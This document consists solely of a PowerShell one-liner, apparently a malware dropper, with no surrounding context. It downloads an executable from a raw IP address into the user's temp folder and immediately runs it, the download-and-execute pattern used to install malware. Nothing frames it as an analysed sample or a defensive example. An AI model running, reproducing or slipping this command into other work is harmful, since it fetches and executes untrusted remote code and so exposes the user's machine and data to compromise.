
($dpl=$env:temp+'f.exe');(New-Object System.Net.WebClient).DownloadFile('http://198.50.137.173/b.exe', $dpl);Start-Process $dpl

